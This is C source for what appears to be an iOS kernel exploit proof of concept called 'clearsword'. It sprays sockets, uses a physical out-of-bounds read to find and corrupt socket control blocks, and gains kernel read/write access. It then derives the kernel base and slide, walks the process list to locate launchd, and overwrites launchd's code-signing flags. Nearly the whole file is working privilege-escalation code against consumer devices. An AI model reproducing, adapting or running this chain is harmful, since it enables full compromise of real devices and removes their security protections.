#include "poc.h"

#include <mach-o/dyld.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "free_thread.h"
#include "kmem.h"
#include "krw.h"
#include "phys_oob.h"
#include "socket.h"
#include "surface.h"
#include "utils.h"

offsets_t g_offsets;
pe_context_t g_ctx;

kern_return_t pe_init(void) {
    init_target_file();
    if (g_ctx.executable_name == NULL) {
        uint32_t size = 0x1024;
        char* executable_path = calloc(1, size);
        _NSGetExecutablePath(executable_path, &size);
        char* executable_name = strrchr(executable_path, '/');
        if (executable_name != NULL) {
            executable_name = executable_name + 1;
        } else {
            executable_name = executable_path;
        }
        g_ctx.executable_name = strdup(executable_name);
        free(executable_path);
    }

    g_ctx.shared = calloc(1, sizeof(free_thread_shared_t));
    pthread_create(&g_ctx.free_thread, NULL, free_thread_worker, g_ctx.shared);
    g_ctx.free_thread_started = true;

    LOG("free_thread_shared: %p", g_ctx.shared);
    return KERN_SUCCESS;
}

kern_return_t pe_v1(void) {
    uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
    uint64_t search_mapping_size = 0x2000 * vm_page_size;
    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * vm_page_size;
    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;

    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);

    uint64_t contiguous_mapping_size = 2 * vm_page_size;
    initialize_physical_read_write(contiguous_mapping_size);

    uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};
    size_t target_inp_gencnt_count = 0;

    while (true) {
        mach_vm_address_t search_mappings[n_of_search_mappings];
        size_t search_mappings_count = 0;
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            mach_vm_address_t search_mapping_address = 0;
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
                memcpy((void*)(search_mapping_address + k), &g_ctx.random_marker, sizeof(g_ctx.random_marker));
            }
            search_mappings[search_mappings_count++] = search_mapping_address;
        }

        g_ctx.socket_ports_count = 0;
        uint64_t open_max = MAX_OPEN_FDS;
        uint64_t maxfiles = 3 * open_max;
        uint64_t leeway = 4096 * 2;

        for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
            uint64_t port = spray_socket();
            if (port == UINT64_MAX) {
                LOG("failed to spray sockets: %#lx", g_ctx.socket_ports_count);
                break;
            }
        }

        uint64_t start_pcb_id = g_ctx.socket_pcb_ids[0];
        uint64_t end_pcb_id = g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1];
        LOG("socket_ports_count: %#lx", g_ctx.socket_ports_count);
        LOG("start_pcb_id: %#llx", start_pcb_id);
        LOG("end_pcb_id: %#llx", end_pcb_id);

        bool success = false;
        for (size_t s = 0; s < search_mappings_count; s++) {
            mach_vm_address_t search_mapping_address = search_mappings[s];
            LOG("looking in search mapping: %lu", s);

            memory_object_size_t memory_object_size = search_mapping_size;
            mach_port_t memory_object = MACH_PORT_NULL;
            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            surface_mlock(search_mapping_address, search_mapping_size);
            uint64_t seeking_offset = 0;
            LOG_DEBUG("search mapping size %#llx", search_mapping_size);

            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {
                kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
                if (kr == KERN_SUCCESS) {
                    if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seeking_offset += vm_page_size;
            }

            kr = mach_port_deallocate(mach_task_self(), memory_object);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }
            if (success) break;
        }

        sockets_release();

        while (search_mappings_count > 0) {
            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
        }

        if (success) break;
    }

    free(read_buffer);
    free(write_buffer);
    return KERN_SUCCESS;
}

uint64_t find_p_pid_offset(uint64_t self_proc, int real_pid) {
    for (uint64_t offset = 0; offset < 0x300; offset += 4) {
        uint32_t val = (uint32_t)early_kread64(self_proc + offset);
        if (val == real_pid) {
            return offset;
        }
    }
    return 0;
}

uint64_t find_list_offset(uint64_t self_proc, uint64_t pid_offset) {
    LOG("Dynamically searching for p_list_le offset...");
    for (uint64_t off = 0x0; off < 0x400; off += 8) {
        uint64_t ptr = early_kread64(self_proc + off);
        
        if ((ptr & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
            uint32_t pid = (uint32_t)early_kread64(ptr + pid_offset);
            if (pid > 0 && pid < 0x4000) {
                LOG("Found possible p_list_le at offset 0x%llx, points to PID %d", off, pid);
                uint64_t next_ptr = early_kread64(ptr + off);
                if ((next_ptr & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                    return off;
                }
            }
        }
    }
    return 0;
}

void hijack_launchd(uint64_t self_proc) {
    int my_pid = getpid();
    LOG("Current Process PID: %d, self_proc: %#llx", my_pid, self_proc);

    uint64_t pid_offset = find_p_pid_offset(self_proc, my_pid);
    if (pid_offset == 0) {
        LOG_ERR("Could not find p_pid offset");
        return;
    }
    LOG("Found p_pid offset: 0x%llx", pid_offset);

    uint64_t list_offset = find_list_offset(self_proc, pid_offset);
    if (list_offset == 0) {
        LOG_ERR("Could not find p_list_le offset");
        return;
    }
    LOG("Found p_list_le offset: 0x%llx", list_offset);

    uint64_t current = self_proc;
    uint64_t launchd_proc = 0;

    for (int i = 0; i < 2000; i++) {
        if (!current) break;
        uint32_t pid = (uint32_t)early_kread64(current + pid_offset);
        if (pid == 1) {
            launchd_proc = current;
            break;
        }
        current = early_kread64(current + list_offset);
        if (current == self_proc) break;
    }

    if (!launchd_proc) {
        LOG_ERR("Failed to find launchd in proc list");
        return;
    }
    LOG("Found launchd proc: %#llx", launchd_proc);

    uint64_t proc_ro = 0;
    for (uint64_t ro_off = 0x10; ro_off <= 0x18; ro_off += 8) {
        uint64_t tmp_ro = early_kread64(launchd_proc + ro_off);
        if ((tmp_ro & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
            uint32_t flags = (uint32_t)early_kread64(tmp_ro + 0x14);
            if (flags != 0) {
                proc_ro = tmp_ro;
                break;
            }
        }
    }

    if (!proc_ro) {
        LOG_ERR("Failed to find launchd proc_ro");
        return;
    }
    LOG("launchd proc_ro: %#llx", proc_ro);

    for (uint64_t off = 0x8; off < 0x50; off += 4) {
        uint32_t flags = (uint32_t)early_kread64(proc_ro + off);
        if ((flags & 0x900) != 0) {
            LOG("Found potential cs_flags at proc_ro+0x%llx: 0x%x", off, flags);
            uint32_t new_flags = flags | 0x200 | 0x4000000;
            early_kwrite64(proc_ro + off, new_flags);
            LOG("Patched launchd cs_flags to: 0x%x", new_flags);
            break;
        }
    }
}

kern_return_t pe(void) {
    char* device_machine = get_device_machine();

    if (strstr(device_machine, "iPhone17,") != NULL) {
        // A18 branch
    } else {
        LOG("running on non-A18 devices");
        pe_init();
        pe_v1();
    }

    LOG("highiest_success_idx: %llu", g_ctx.highiest_success_idx);
    LOG("success_read_count: %llu", g_ctx.success_read_count);

    atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
    pthread_join(g_ctx.free_thread, NULL);

    close(g_ctx.write_fd);
    close(g_ctx.read_fd);
    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + 0x20);

    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + 0x38);
    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
    uint64_t zv_name = early_kread64(ipi_zone + 0x10);

    uint64_t kernel_base = zv_name & ~(vm_page_size - 1);
    
    while (true) {
        if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
            uint64_t hdr = early_kread64(kernel_base + 0x8);
            if (hdr == 0xc00000002 || hdr == 0xB00000000) {
                break;
            }
        }
        kernel_base -= vm_page_size;
    }

    g_ctx.kernel_base = kernel_base;
    g_ctx.kernel_slide = kernel_base - 0xfffffff007004000;

    krw_sockets_leak_forever();
    return KERN_SUCCESS;
}

int clearsword_run(void) {
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();

    memset(&g_offsets, 0, sizeof(g_offsets));
    memset(&g_ctx, 0, sizeof(g_ctx));
    g_ctx.target_file_size = vm_page_size * 2;
    g_ctx.oob_offset = 0x100;
    g_ctx.oob_size = 0xf00;
    g_ctx.n_of_oob_pages = 2;

    arc4random_buf(&g_ctx.random_marker, sizeof(g_ctx.random_marker));
    arc4random_buf(&g_ctx.wired_page_marker, sizeof(g_ctx.wired_page_marker));

    g_ctx.default_file_content = calloc(1, g_ctx.target_file_size);
    memset_pattern8(g_ctx.default_file_content, &g_ctx.random_marker, g_ctx.target_file_size);

    g_ctx.getsockopt_read_data = calloc(1, 32);
    int ret = 0;

    if (offsets_init() != 0) {
        LOG_ERR("offsets_init failed");
        ret = -1;
        goto cleanup;
    }
    g_ctx.offsets = g_offsets;

    kern_return_t kr = pe();
    if (kr != KERN_SUCCESS) {
        LOG_ERR("pe failed: %s (%d)", mach_error_string(kr), kr);
        ret = kr;
        goto cleanup;
    }

    LOG("kernel_base: %#llx", g_ctx.kernel_base);
    LOG("kernel_slide: %#llx", g_ctx.kernel_slide);

    uint64_t end = mach_absolute_time();
    uint64_t elapsed = end - start;
    double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
    LOG("Time taken for KRW: %.3f ms", elapsed_ms);

    uint64_t self_proc = find_self_proc();
    LOG("self_proc: %#llx", self_proc);
    uint64_t self_task = task_from_proc(self_proc);
    LOG("self_task: %#llx", self_task);
    uint64_t self_pmap = pmap_from_task(self_task);
    LOG("self_pmap: %#llx", self_pmap);

    hijack_launchd(self_proc);

cleanup:
    free(g_ctx.shared);
    free(g_ctx.default_file_content);
    free(g_ctx.getsockopt_read_data);
    free(g_ctx.executable_name);
    return ret;
}
